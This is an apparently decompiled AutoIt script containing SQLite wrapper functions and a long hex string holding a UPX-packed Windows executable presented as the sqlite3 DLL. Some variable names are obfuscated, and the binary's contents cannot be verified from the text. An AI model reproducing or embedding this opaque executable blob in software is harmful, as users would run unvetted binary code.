    Local $tsql8 = __sqlite_stringtoutf8struct($ssql)
    If @error Then Return SetError(4, @error, 0)
    Local $avrval = DllCall($g_hdll_sqlite, "int:cdecl", "sqlite3_exec", "ptr", $hdb, "struct*", $tsql8, "ptr", 0, "ptr", 0, "long*", 0)
    If @error Then Return SetError(1, @error, $sqlite_misuse)
    __sqlite_szfree($avrval[5])
    If $avrval[0] <> $sqlite_ok Then
        __sqlite_reporterror($hdb, "_sqlite_exec", $ssql)
        SetError(-1)
    EndIf
    Return $avrval[0]
EndFunc

Func _sqlite_errmsg($hdb = -1)
    If __sqlite_hchk($hdb, 2) Then Return SetError(@error, @extended, "Library used incorrectly")
    Local $hquery = DllCall($g_hdll_sqlite, "wstr:cdecl", "sqlite3_errmsg16", "ptr", $hdb)
    If @error Then
        __sqlite_reporterror($hdb, "_sqlite_errmsg", Default, "Call Failed")
        Return SetError(1, @error, "Library used incorrectly")
    EndIf
    Return $hquery[0]
EndFunc

Func _sqlite_gettable2d($hdb, $ssql, ByRef $aresult, ByRef $irows, ByRef $icolumns, $icharsize = -1, $fswichdimensions = False)
    If __sqlite_hchk($hdb, 1) Then Return SetError(@error, 0, $sqlite_misuse)
    If $icharsize = "" Or $icharsize < 1 Or IsKeyword($icharsize) Then $icharsize = -1
    Local $scallback = "", $fcallback = False
    If IsString($aresult) Then
        If StringLeft($aresult, 16) = "SQLITE_CALLBACK:" Then
            $scallback = StringTrimLeft($aresult, 16)
            $fcallback = True
        EndIf
    EndIf
    $aresult = ""
    If IsKeyword($fswichdimensions) Then $fswichdimensions = False
    Local $hquery
    Local $hquery = _sqlite_query($hdb, $ssql, $hquery)
    If @error Then Return SetError(2, @error, $hquery)
    If $hquery <> $sqlite_ok Then
        __sqlite_reporterror($hdb, "_sqlite_gettable2d", $ssql)
        _sqlite_queryfinalize($hquery)
        Return SetError(-1, 0, $hquery)
    EndIf
    $irows = 0
    Local $irval_step, $err
    While True
        $irval_step = DllCall($g_hdll_sqlite, "int:cdecl", "sqlite3_step", "ptr", $hquery)
        If @error Then
            $err = @error
            _sqlite_queryfinalize($hquery)
            Return SetError(3, $err, $sqlite_misuse)
        EndIf
        Switch $irval_step[0]
            Case $sqlite_row
                $irows += 1
            Case $sqlite_done
                ExitLoop
            Case Else
                _sqlite_queryfinalize($hquery)
                Return SetError(3, $err, $irval_step[0])
        EndSwitch
    WEnd
    Local $ret = _sqlite_queryreset($hquery)
    If @error Then
        $err = @error
        _sqlite_queryfinalize($hquery)
        Return SetError(4, $err, $ret)
    EndIf
    Local $H4DX2WA4S
    $hquery = _sqlite_fetchnames($hquery, $H4DX2WA4S)
    If @error Then
        $err = @error
        _sqlite_queryfinalize($hquery)
        Return SetError(5, $err, $hquery)
    EndIf
    $icolumns = UBound($H4DX2WA4S)
    If $icolumns <= 0 Then
        _sqlite_queryfinalize($hquery)
        Return SetError(-1, 0, $sqlite_done)
    EndIf
    If Not $fcallback Then
        If $fswichdimensions Then
            Dim $aresult[$icolumns][$irows + 1]
            For $i = 0 To $icolumns - 1
                If $icharsize > 0 Then
                    $H4DX2WA4S[$i] = StringLeft($H4DX2WA4S[$i], $icharsize)
                EndIf
                $aresult[$i][0] = $H4DX2WA4S[$i]
            Next
        Else
            Dim $aresult[$irows + 1][$icolumns]
            For $i = 0 To $icolumns - 1
                If $icharsize > 0 Then
                    $H4DX2WA4S[$i] = StringLeft($H4DX2WA4S[$i], $icharsize)
                EndIf
                $aresult[0][$i] = $H4DX2WA4S[$i]
            Next
        EndIf
    Else
        Local $C9QF4SO7Z
        $C9QF4SO7Z = Call($scallback, $H4DX2WA4S)
        If $C9QF4SO7Z = $sqlite_abort Or $C9QF4SO7Z = $sqlite_interrupt Or @error Then
            $err = @error
            _sqlite_queryfinalize($hquery)
            Return SetError(7, $err, $C9QF4SO7Z)
        EndIf
    EndIf
    If $irows > 0 Then
        For $i = 1 To $irows
            $hquery = _sqlite_fetchdata($hquery, $H4DX2WA4S, 0, 0, $icolumns)
            If @error Then
                $err = @error
                _sqlite_queryfinalize($hquery)
                Return SetError(6, $err, $hquery)
            EndIf
            If $fcallback Then
                $C9QF4SO7Z = Call($scallback, $H4DX2WA4S)
                If $C9QF4SO7Z = $sqlite_abort Or $C9QF4SO7Z = $sqlite_interrupt Or @error Then
                    $err = @error
                    _sqlite_queryfinalize($hquery)
                    Return SetError(7, $err, $C9QF4SO7Z)
                EndIf
            Else
                For $j = 0 To $icolumns - 1
                    If $icharsize > 0 Then
                        $H4DX2WA4S[$j] = StringLeft($H4DX2WA4S[$j], $icharsize)
                    EndIf
                    If $fswichdimensions Then
                        $aresult[$j][$i] = $H4DX2WA4S[$j]
                    Else
                        $aresult[$i][$j] = $H4DX2WA4S[$j]
                    EndIf
                Next
            EndIf
        Next
    EndIf
    Return (_sqlite_queryfinalize($hquery))
EndFunc

Func _sqlite_query($hdb, $ssql, ByRef $hquery)
    If __sqlite_hchk($hdb, 2) Then Return SetError(@error, 0, $sqlite_misuse)
    Local $irval = DllCall($g_hdll_sqlite, "int:cdecl", "sqlite3_prepare16_v2", "ptr", $hdb, "wstr", $ssql, "int", -1, "long*", 0, "long*", 0)
    If @error Then Return SetError(1, @error, $sqlite_misuse)
    If $irval[0] <> $sqlite_ok Then
        __sqlite_reporterror($hdb, "_sqlite_query", $ssql)
        Return SetError(-1, 0, $irval[0])
    EndIf
    $hquery = $irval[4]
    __sqlite_hadd($__ghquerys_sqlite, $irval[4])
    Return $irval[0]
EndFunc

Func _sqlite_fetchdata($hquery, ByRef $arow, $fbinary = False, $fdonotfinalize = False, $icolumns = 0)
    Dim $arow[1]
    If __sqlite_hchk($hquery, 7, False) Then Return SetError(@error, 0, $sqlite_misuse)
    If IsKeyword($fbinary) Then $fbinary = False
    If IsKeyword($fdonotfinalize) Then $fdonotfinalize = False
    Local $irval_step = DllCall($g_hdll_sqlite, "int:cdecl", "sqlite3_step", "ptr", $hquery)
    If @error Then Return SetError(1, @error, $sqlite_misuse)
    If $irval_step[0] <> $sqlite_row Then
        If $fdonotfinalize = False And $irval_step[0] = $sqlite_done Then
            _sqlite_queryfinalize($hquery)
        EndIf
        Return SetError(-1, 0, $irval_step[0])
    EndIf
    If Not $icolumns Then
        Local $irval_colcnt = DllCall($g_hdll_sqlite, "int:cdecl", "sqlite3_data_count", "ptr", $hquery)
        If @error Then Return SetError(2, @error, $sqlite_misuse)
        If $irval_colcnt[0] <= 0 Then Return SetError(-1, 0, $sqlite_done)
        $icolumns = $irval_colcnt[0]
    EndIf
    ReDim $arow[$icolumns]
    For $i = 0 To $icolumns - 1
        Local $irval_coltype = DllCall($g_hdll_sqlite, "int:cdecl", "sqlite3_column_type", "ptr", $hquery, "int", $i)
        If @error Then Return SetError(4, @error, $sqlite_misuse)
        If $irval_coltype[0] = $sqlite_type_null Then
            $arow[$i] = ""
            ContinueLoop
        EndIf
        If (Not $fbinary) And ($irval_coltype[0] <> $sqlite_type_blob) Then
            Local $srval = DllCall($g_hdll_sqlite, "wstr:cdecl", "sqlite3_column_text16", "ptr", $hquery, "int", $i)
            If @error Then Return SetError(3, @error, $sqlite_misuse)
            $arow[$i] = $srval[0]
        Else
            Local $vresult = DllCall($g_hdll_sqlite, "ptr:cdecl", "sqlite3_column_blob", "ptr", $hquery, "int", $i)
            If @error Then Return SetError(6, @error, $sqlite_misuse)
            Local $icolbytes = DllCall($g_hdll_sqlite, "int:cdecl", "sqlite3_column_bytes", "ptr", $hquery, "int", $i)
            If @error Then Return SetError(5, @error, $sqlite_misuse)
            Local $vresultstruct = DllStructCreate("byte[" & $icolbytes[0] & "]", $vresult[0])
            $arow[$i] = Binary(DllStructGetData($vresultstruct, 1))
        EndIf
    Next
    Return $sqlite_ok
EndFunc

Func _sqlite_close($hdb = -1)
    If __sqlite_hchk($hdb, 2) Then Return SetError(@error, 0, $sqlite_misuse)
    Local $irval = DllCall($g_hdll_sqlite, "int:cdecl", "sqlite3_close", "ptr", $hdb)
    If @error Then Return SetError(1, @error, $sqlite_misuse)
    If $irval[0] <> $sqlite_ok Then
        __sqlite_reporterror($hdb, "_sqlite_close")
        Return SetError(-1, 0, $irval[0])
    EndIf
    $g_hdb_sqlite = 0
    __sqlite_hdel($__ghdbs_sqlite, $hdb)
    Return $irval[0]
EndFunc

Func _sqlite_queryfinalize($hquery)
    If __sqlite_hchk($hquery, 2, False) Then Return SetError(@error, 0, $sqlite_misuse)
    Local $avrval = DllCall($g_hdll_sqlite, "int:cdecl", "sqlite3_finalize", "ptr", $hquery)
    If @error Then Return SetError(1, @error, $sqlite_misuse)
    __sqlite_hdel($__ghquerys_sqlite, $hquery)
    If $avrval[0] <> $sqlite_ok Then SetError(-1)
    Return $avrval[0]
EndFunc

Func _sqlite_queryreset($hquery)
    If __sqlite_hchk($hquery, 2, False) Then Return SetError(@error, 0, $sqlite_misuse)
    Local $avrval = DllCall($g_hdll_sqlite, "int:cdecl", "sqlite3_reset", "ptr", $hquery)
    If @error Then Return SetError(1, @error, $sqlite_misuse)
    If $avrval[0] <> $sqlite_ok Then SetError(-1)
    Return $avrval[0]
EndFunc

Func _sqlite_fetchnames($hquery, ByRef $anames)
    Dim $anames[1]
    If __sqlite_hchk($hquery, 3, False) Then Return SetError(@error, 0, $sqlite_misuse)
    Local $avdatacnt = DllCall($g_hdll_sqlite, "int:cdecl", "sqlite3_column_count", "ptr", $hquery)
    If @error Then Return SetError(1, @error, $sqlite_misuse)
    If $avdatacnt[0] <= 0 Then Return SetError(-1, 0, $sqlite_done)
    ReDim $anames[$avdatacnt[0]]
    Local $avcolname
    For $icnt = 0 To $avdatacnt[0] - 1
        $avcolname = DllCall($g_hdll_sqlite, "wstr:cdecl", "sqlite3_column_name16", "ptr", $hquery, "int", $icnt)
        If @error Then Return SetError(2, @error, $sqlite_misuse)
        $anames[$icnt] = $avcolname[0]
    Next
    Return $sqlite_ok
EndFunc

Func __sqlite_hchk(ByRef $hgeneric, $nerror, $bdb = True)
    If $g_hdll_sqlite = 0 Then Return SetError(1, $sqlite_misuse, $sqlite_misuse)
    If $hgeneric = -1 Or $hgeneric = "" Or IsKeyword($hgeneric) Then
        If Not $bdb Then Return SetError($nerror, 0, $sqlite_error)
        $hgeneric = $g_hdb_sqlite
    EndIf
    If Not $__gbsafemodestate_sqlite Then Return $sqlite_ok
    If $bdb Then
        If _arraysearch($__ghdbs_sqlite, $hgeneric) > 0 Then Return $sqlite_ok
    Else
        If _arraysearch($__ghquerys_sqlite, $hgeneric) > 0 Then Return $sqlite_ok
    EndIf
    Return SetError($nerror, 0, $sqlite_error)
EndFunc

Func __sqlite_hadd(ByRef $ahlists, $hgeneric)
    _arrayadd($ahlists, $hgeneric)
EndFunc

Func __sqlite_hdel(ByRef $ahlists, $hgeneric)
    Local $ielement = _arraysearch($ahlists, $hgeneric)
    If $ielement > 0 Then _arraydelete($ahlists, $ielement)
EndFunc

Func __sqlite_verscmp($sfile, $sversion)
    Local $avrval = DllCall($sfile, "str:cdecl", "sqlite3_libversion")
    If @error Then Return $sqlite_corrupt
    Local $szfileversion = StringSplit($avrval[0], ".")
    Local $maintversion = 0
    If $szfileversion[0] = 4 Then $maintversion = $szfileversion[4]
    $szfileversion = (($szfileversion[1] * 1000 + $szfileversion[2]) * 1000 + $szfileversion[3]) * 100 + $maintversion
    If $sversion < 10000000 Then $sversion = $sversion * 100
    If $szfileversion >= $sversion Then Return $sqlite_ok
    Return $sqlite_mismatch
EndFunc

Func __sqlite_reporterror($hdb, $sfunction, $squery = Default, $serror = Default, $vreturnvalue = Default, $curerr = @error, $curext = @extended)
    If @Compiled Then Return SetError($curerr, $curext)
    If IsKeyword($serror) Then $serror = _sqlite_errmsg($hdb)
    If IsKeyword($squery) Then $squery = ""
    Local $sout = "!   SQLite.au3 Error" & @CRLF
    $sout &= "--> Function: " & $sfunction & @CRLF
    If $squery <> "" Then $sout &= "--> Query:    " & $squery & @CRLF
    $sout &= "--> Error:    " & $serror & @CRLF
    __sqlite_print($sout & @CRLF)
    If Not IsKeyword($vreturnvalue) Then Return SetError($curerr, $curext, $vreturnvalue)
    Return SetError($curerr, $curext)
EndFunc

Func __sqlite_szfree($ptr, $curerr = @error)
    If $ptr <> 0 Then DllCall($g_hdll_sqlite, "none:cdecl", "sqlite3_free", "ptr", $ptr)
    SetError($curerr)
EndFunc

Func __sqlite_stringtoutf8struct($sstring)
    Local $aresult = DllCall("kernel32.dll", "int", "WideCharToMultiByte", "UINT", 65001, "dword", 0, "wstr", $sstring, "int", -1, "ptr", 0, "int", 0, "ptr", 0, "ptr", 0)
    If @error Then Return SetError(1, @error, "")
    Local $ttext = DllStructCreate("char[" & $aresult[0] & "]")
    $aresult = DllCall("kernel32.dll", "int", "WideCharToMultiByte", "UINT", 65001, "dword", 0, "wstr", $sstring, "int", -1, "struct*", $ttext, "int", $aresult[0], "ptr", 0, "ptr", 0)
    If @error Then Return SetError(2, @error, "")
    Return $ttext
EndFunc

Func __sqlite_download_sqlite3dll($tempfile, $version)
    Local $url = "http://www.autoitscript.com/autoit3/files/beta/autoit/archive/sqlite/SQLite3" & $version
    Local $ret
    If @AutoItX64 = 0 Then
        $ret = InetGet($url & ".dll", $tempfile, 1)
    Else
        $ret = InetGet($url & "_x64.dll", $tempfile, 1)
    EndIf
    Local $error = @error
    FileSetTime($tempfile, __SQLITE_INLINE_MODIFIED(), 0)
    Return SetError($error, 0, $ret)
EndFunc

Func __sqlite_print($stext)
    If $g_sprintcallback_sqlite Then
        If $g_butf8errormsg_sqlite Then
            Local $tstr8 = __sqlite_stringtoutf8struct($stext)
            Call($g_sprintcallback_sqlite, DllStructGetData($tstr8, 1))
        Else
            Call($g_sprintcallback_sqlite, $stext)
        EndIf
    EndIf
EndFunc

Func _sqlite3_dll_data()
    Global $sHex = "0x"
    $sHex &= "4D5A90000300000004000000FFFF0000B800000000000000400000000000000000000000000000000000000000000000000000000000000000000000F00000000E1FBA0E00B409CD21B8014CCD21546869732070726F6772616D2063616E6E6F742062652072756E20696E20444F53206D6F64652E0D0D0A24000000000000000F00D7134B61B9404B61B9404B61B94042193D405061B94042192C405161B94042193A401161B9406CA7C2404861B9404B61B8402661B940421930404A61B94042192B404A61B94055332D404A61B940421928404A61B940526963684B61B94000000000000000000000000000000000504500004C010300E8507B4C0000000000000000E00002210B010900005003000020000000400500009D08000050050000A008000000001000100000000200000500000000000000050000000000000000C00800001000000000000002000000000010000010000000001000001000000000000010000000D0A508008C16000038A508009800000000A0080038050000000000000000000000000000000000005CBC0800100000000000000000000000000000000000000000000000000000000000000000000000EC9E08004800000000000000000000000000000000000000000000000000000000000000000000000000000000000000555058300000000000400500001000000000000000040000000000000000000000000000800000E0555058310000000000500300005005000050030000040000000000000000000000000000400000E02E727372630000000020000000A00800001E000000540300000000000000000000000000400000C000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000332E393100555058210D09080A"
    $sHex &= "BD2FFDAEE644B91B937B0800F34C030000300800260E00A4FFFFFFFF3B0D0007A0007502F3C3E90E00281DCC558BEC57568B750C8B4D108B7D088BC1FFEFFFFF8BD103C63BFE76083BF80F82A401000081F9000A721F833D0008133400BFF6F6DB74165A83E70F83E60F485E5F7508065D8E29AAF7EDFFBFD9C7034AAC15C1E90283E20383F908722AF3A5FF24952601BDF6BFFB84908BC7BA3B83E904720C83E00303C830851E98F3DED9A73E8D94900F189026A806D4CDAEFDFFF823D18A0688078A46018847010A02AE10B4C6631FF235C7BBCC8D490057A4B2C07C4B0106C702A6549A72964783C68601883CEFBD800C7B06680E6058FC3FCFF3504840388B448EE489448FE4F33CCFF3E8E8ECECF0CFF33CCFF0F4F4F8F8FCDEDE063FFC8D04B60003F003F8D98BFFC3CFF30CE9069CA8BC8B458E5BB066F0C9C3904317FB231D06C36046231CC915B787578D7431CE7C39FC092461F32B380DFDC6FCEF0320F7D919198AFBD302D09627F92BE7BDB61C0224589016340658EC3633B480DA037CDEA2EE01B5EF0145D82DA9B29E47577649E54DEE520288904F346D14B748675A03034162B6E3EA56FF00B7069EE779DED406DCE4ECF4FC799E8BF73C040617361C1C18E7799EE718141410109EE7799E0C0C08080404F39E4348470A300638A6220CCF485CC716039628DE92031F0F279476500477CC012F9047C5DF04F40408F3DE232F050404889008180644007901D368DF04F47B2F901C04F4870CEB06CFF33CCFD8D0C8C0B8B0E710303DA8DF04F44DCFF306E8060C182CDF210F3900069006409EF7CE1E059443909016A406C8F043202F9ADF069006DE7BA19090B70C44064C799EE779545C646C74398480E987DF47C0F43CEF0AA006A8B8CCDFEFFAC906ACCC51836542538B5D107FC33FFD85DB750733C06C07945783FBFE758D7BFC85FF76FFFFBFAA6E040C5E8A1083C00483C10484D274523A51FC754D8A50CDD3DCBCFD163CFD7537FE26FEFFDF3CCD7521FF10FF750B8345FC04397DFC72C2EBCFCF7BFB3F0FB640FF0649FFEB4612FEFEEB3CFD9DFD3C3FFDEB32FCFCEB28DBEB0FFCCDFF9FDE8A143A1175104041FF45FC395DEC33C05F5BC9C3B83EF8D60004092BC1EBF27F565740D21A6E3794C783E82A84E51536480CCD993932329849B914B96B5F70F0536A205ACC0CE8303B31747C9830047DDFF07F192BF3741533DB85F60F9F8C5C1BFF8BF31485691CB06D3B1E3670010659014148C801F28C020227FB813CCF030311EB0233F649E479FFA7028B70043B7104747E9A040480BCCB03D90305400507C83372B80606971E210723071E07720390E7D254080808080079460E4909090E9067E4280A0A07F20879460B0BE202007997A60C0C0C9A0C1C20EFF2"
    $sHex &= "B9020D400D98C801F28C0E0E772E47C8C10F1E0F52100ED85B6910591060109B29C8017B46111141089707C8C3123E12E701135379843C13C201147280BC4B14149A1499460E903715401578161939400E1E165717349723E4173218182307C8BB189A180919E7F200794019E8001A0E460E901AC71B1E1BBBA93C42A2001C1C747258BC6D24CF1C1C14757D381D3CCF00F21D601E1EC873308043061F1FFBFFFF17752203C203CA2BFA3BFA0F8386FBFFFF03C703CF83FF620778FB6887DAFEFF24BD081DA58BC62810F2BCB5FF448B50E43B51E474719AF2DA51E42BF2D279CFD3BCC28D5412F2D5E538E5409E6700B8E6E63092E7199BE7E74D8108C35776CC04E8E8DA42DEC8747DE890154E4E7280BC7798E940E92D2307C833EAEA0CEB541E21071CEBE7FEECF2800DD2ECEC99BFFE8C1C20EFED40ED9EEEC1C801F2EE7DEF1C692E47C8EF58F0F019394006F030F19E9103E4F10FF2F2E4B93C40EEFDF3F39C9ACA23C9FDF4F4D1193960CF0A60F49BA0F53C2307ECF5417FF6F6F23072805EF73CF7204DE51139FDF8F8F2460ED8F89911F940F920CFE501F0FCFAFA841C8C1CCFFB1CFB37725379AAFCFCFC746FFC5625EFFD920F85D275368CFD34FD813CCF331BFEFE133E7821FE74048BC2EB1DA72BC100C985C0BDF6346FC18D4C09C1C01C750A5B06691A5EA61D9D26E3E3E3F22E0F08A3FDFBE440E4DAAAC801DCF141C47015B9BBF9270D52507996FBE71CE7E7886BE480996EE801B0E445F24DFB2CFB90E632441D07EBEB5C97076CEB99DFFAEC01252F9247BEFA9DFA9ACA21821D78FAEFEF8D1CB041EF9950F0BC481E71012FFA0EFA2A8708961DE9F9F379C00669F3F399C1F9920BE46AFE51F9435C4B86F9DD5AF3BA3495F9F7F7F71F9B11D7C80131F80161C98BE410F9EFF890A672883DCAF8FBFB7923076CFB99A2FC40FC6D57E400810D4122F88A5C60191DEBE7EB3B3B494924400F8400301506D7FC2DBFE2F2800D5260E2E2DDF1F745F288EBE359D0F739C4B0E4AFF77F8AF7800D5250E61CE6E699F2886BE462E75941F744B0E44520F71D0B4B5339FBF6EAEA11D7728871D3F65960C98BE4B2F691F62CCD65881D6CEEEE5CCB212E7144F659252F924723F602F69ACA21821DDDF5F2F296435C5871B5F55E248FB85994F573F595435C4B174EF5F601F3BA34F6F6799BCC0EBACE25590441F8D7E501F2F8E3F4F9614DE511833DBEF4FAFACB212E2C7196F42F92475C5975F454F49E2182251D2F66AFBB040B1EFE66206884F4F77D0B663B4F51701ED6FBBF5C6A819F6013063E1434EAB9340DA8E1E1E1E111D76582FFF3E28361C98BE4AFF38EF396A67288A969F3E5E5AEE51017F341F3839217C92320F3FFF24DE510C11DDAF2E9E9C9216E2CF5B2F2"
    $sHex &= "C98BAE1391F28370F2CD6588601D4BEDEDC9216E2CF523F2C98BAE1302F283E1F1A37288601DBCF1F101D28DA578F1F67045D789E493F172F18539C4B0E451F13D2CF1881B4B53F5F5F5B0E4447204F1E3F008969CBADDC2F01D63692A2F9DF0F9F99D480E71F575F054F0044B5E748333F01DF2B5AE430EF08B24DDBFF08C4784CA36C2694D05801981081856121651DF20DF2BC2E7C0C21485ED460ED8D70F413E560141CC0266E4007902AB0345883BC44E037A9B1E7B908940A092111170B415BC756809394B8E0CB54F014E02EB9E8F204E0177016CFEEA1CFA8B454D0CF121DB823B80125E5DC340104606143866B36D3618441C651E0FC913A9E7799ECD17B51BD63A1925D96C369B470EAA128A16961AB7D93CCFE61B11FB07280D8CF3369BED6C06157819990CFDC6DD3FCF7BDEE91E0A7AE64E5A7A6A0C2B0A16FC68000779B0E82238B89A08787475E0F71B031F300375436A042C2DC159BDE0BB27BA5615F4598945E4B274095650FFD7A5FF1C2E245959C745FC0AFF1A1E77837DE40075377BFBFFB6FF88EB0A732CE759C3566A00FF359C06DCFF15CCBBEFEF6130C82A16322B8E8BF021808F2B4C5B26D8E089065901FDC31BD0EA28F83B309C223B7C13207722196DF69A7235D3FFF58B1C8BFCF70484FBB98883FEE00F87A13018BC7F1A53578B3DEECCC62807F7F7575C18523F666A1E0C3DBB68FF42B03BFFF01D9A2CA10783F801750E24048BC6EB03EE1AEC155E4050EB1C24300BFF1EAF591A78B10C9B20014683C60A81A7A06CF0D7D78BD8122E3B88B60B9A5E3905200B80542AD3871F83AFAE66740F20021F1813F165FFED89300D5F8BC35BEB14564D27C7FFE0D1485681C04C9383EC145333EF9B7683DB9F895DF804F4FC3BF3751E575BEB3FF76A165E53019D410D83C41417223D7DFBEEE0576A24AFB122AC8B7D0C340C3BFB7519DB85C0826B7A47043BDE0F7FECFF17FC067C133BCB72B0F8077C1B7F0881F9FF6F409376116D07FFCD2C62BF3C20487B8D45F850BE4B69E77B954E0DA5A03FE534F492CB007287FCC0FFDE5E91960C8B4804FE8B3F7C6EF8FF80F403008BFFDBDB76642AFC992BF86CEC501BCA56897DEC894DF05C685609CC490B62FA4C01393B81496530ECEADD48CAB0D8D9EDB41C3272F499296E751955C1FBB9A6526B16C746200A009FC77E07B63A5039F900A574329D74AAFA83AA278AF40E03C1998BC8CC89DEEE75BBAA0612F82BF91BDA1BD995EB0FEC7860F72D5028641BDA366A3CFECD3C72F8DA4CCC8C7D0B83C03C83C7C4DBF9A6DD1683D3FF371C6446042403F84D9E856D2813DA6528660C4B06999A18690818C8EC9A910818E818691841BBBD2A18D27C2B7FAEC9761B7C189E3040FB7F6A07995FF7FF014E0C8956"
    $sHex &= "180A1C3D3F9F9B1852487FF57C73EF8D44016FCE32334E4D1E53C27FD281C143F376836DE666D41FFF4E140C0A4CF65165100BBA6F6A0AEE01E870D1E35034FA9B5DDD8058B7A7495F8B5424A84C240449F8F4AD3469FA8A44240884C081FA7FD577D24B0E056C50B68CF983FA047231F7551FC2FFD983E103740C2BD18807F4E95EF6783AC105B0C1E0089C0D10CAEF0D82425E107406F3ABB00AB1EF53664FEAC05FC30A04C3FFF616C2CF0408F7C2D73C8B023A4CFFB76EE02E0AC0286110250AE4741DC1E8103A4102812EF34C78281112101708B6BB9A83C2043475D2A666C3901BDA9FB6E1C0D1E00A01C3860174188A023C0177A5BDF68CE7500168DC2E02A4668B30B7A7F274BFCEC6C5BD4A02EB88F87AB9C06A1024F05D08920E030FF66A7A0CE5FE59F825A10297EE97EAEC0C5325219FD0F419916730EE33FF36E46C1B700FE58A1A7126FC53C06CFA0A89E03BC72E9E00A3F3E233BB495653503C32F2C6B231E0AE05B2E4EB35CB5A53B0EA3FEC43FC483BC67202EC50531CE4F3BB4C803A9F9C7B2E2480E06F6D1839F2754EF7750633F6468946D974E07B331056570FCCA7C0AD0D902010E099140DA8F8A3BB24F8837DE02631DDA68103B7A953BDD0108C0387C3EB123868050B54AA161E85FF90BF3D17B82F64402CC560D2BC0611B607A339BA756C291C76BA0BF006EB5F7783497468A9E0E00B29EB711301786C0A6C607556E934D1741F23AC0ABC1A76CDB76330E15ABC25912D7E430EAEA74F8BC7EBD271A89A9170DF11347C37A1C0EB7D77EE3B26FE2055C31F33D1EBE90C5F8DBEEFBBF891D8A3D2381E5E561203A4525881B7F95E697D526FEBCF1E5D9B7C2010BBEB84CF5B23176A1797BD0BFF0566148E3FDDA0C5FB5AD5EBC9C8829DFB3B281EA62E7E81FF0D0F1B08BC77F3E16075055A3D5E10757B59C3EE9A0413216A6E7C59213B68140698079F146A01D85795DEE1878BA2F72436DA56A007A410753FFCDBAD0C483A51C059FFD0861757566FAC4D2FFE81529FD4834E04FF4418560DC20EAF30E93A07570955592F181AA15EC0C2CCA9D13DFE747A10E89FF98BF23C360416CD60A789391571F2C51A0285E817B43BF0FA5846E2AC79DB2EA16631C0EC0853FE5A88EF4E1BBC4E96229825CF45F790E6192483615A4FFE326698BD4424FC57502757905FE0EC6E58A50622A6FCD55CD9175660269F680321D1BC2DC4A6D1FF19CAEB1D3DDA7D87080A088B095051C13A59CC65E8F15CD8B13FA5637D0C011D100A7C1D6160001055093F877B91270459314581EC7E7EFF18C02404C0890D0ABC8915B8891DEB7E7E7EB48935B0893DAC668C31D80C3CAD334F0DCC41A82805A4293FCDD325A02D9C9C8FE595F6351845ADC40E04C88D45080576DD7AD4"
    $sHex &= "8B85E0AAC7471001B8EF778D5CA13927C42703B8090400C013EE42E2B4BC3A00888985D864BA1FA7E91504DC05EC9D082FBAD53F8561F6591229E8D831C431976B7815923D416C4747FCFDDC68B737E0500DDCC9C3B1E8D56540083AA0F8797DDF7FE3774FC1E907EB068D7E00660F6F06064E10BEB7F97C0856205E307F07064F247F57E7F3FD7C7F5F6F6640086E507660FEF3F9DE7E703067267F6F7F777F7F708DB68082DBBDFBA68DBF0B4975A38BE6F28BE55D0D444A9C661CF4B048FE86170A12C3C46833CA2BCA83E10F1CC4BBE00DA433FA2BFA4CBF55D8EF0D8BD10BD7754A84AACE3E7F894DE83BF16F982FF074132BF1972923E95FB5857DE885C974779EF703D3068955EC03D80B5FD3DA2BD9C6F0F8ECF040F3A4A16DC21F5E533BCF7535A0C11094E4F64EF18613E4364D14207A550A70A4BBE845102B00505251C3AAEB1AE02608C66D22D4F3A58BE33C68EF5E03A9ECFCC5F4D80F235FBB7A30FCB228C1C79A2E9151475F23A5226E9AE12EB20518E80A3D1D0DE6C34D6F18AD54BB1A0366DB8128C5EC1844538934047F55C39BF4F8539C586835482000509D9C5A2BC460D7FCD1741F519D33A23B5DE8F684FD9EEB66B8E3245566F85BF774B811BE4744740EA82A8DFAE44027C418FAFA25DDE82D327B70341CDD1FC93B04CDF8EDBFE11408D84183F92D72F18D48ED0E11770E6A0D58070BF184B637C80544566AAFEC5F800EAEC81BC023C183C00824CA5393D9BD8038FE07A170C326A9A0E1226BB839AC7E0F94C04010061E38911635F0A3AE903570B8045D090B3012406F37AE395712391D16185CF80AFFA3C87E33568B981C83C67E81FE3E3DBC1E76FC93F8FF3635DAFB771B3C14433B717CD85EFF63390E7A8A705F5B9BF483254975F0F70746565733F6BF18E0833CF57484AB84DFDDA81E8D041380893868A00FFE3083C0237CA0C79E620D59DE0C465E81052EB0247CD205642453B8DF6D11D8EBF194538B1DB6A456BE2781FF0D17763E85FF8C837E0401740D57FFD357DFDB056F97832600594C0881FE44A2A07CDC535F3473F7D08B06F0537503503F0FDC47F1E65E5B35FF34C5597D608CF8321CE15033FF472A230A0D1E69A8F10A7DB041BA8D3461391EF0A1416DF7C7EB6E6A57575032F86E0FD5233E507BEB516A0ABB64780C1FB65E752C19571175171FB12A24A3E7B60B899047A4ED3EEB0735852DB82778B0E40AB2568DB5833E035CB7009C135039FEBEB2A1078A9F113AD859C4E98CFE162DDE578B0DC5A1BD6BC91403C8EB11F061C6AB80082B500C9CC472864382DF90C0143BC172EB84B7101563E281824110622CFE55F8AFC42B7976FCC1EF0F8BCF69C904528DF0F6D3E98C01446E7C8B0E490AFCF6C10195E93F218C30538D1C31"
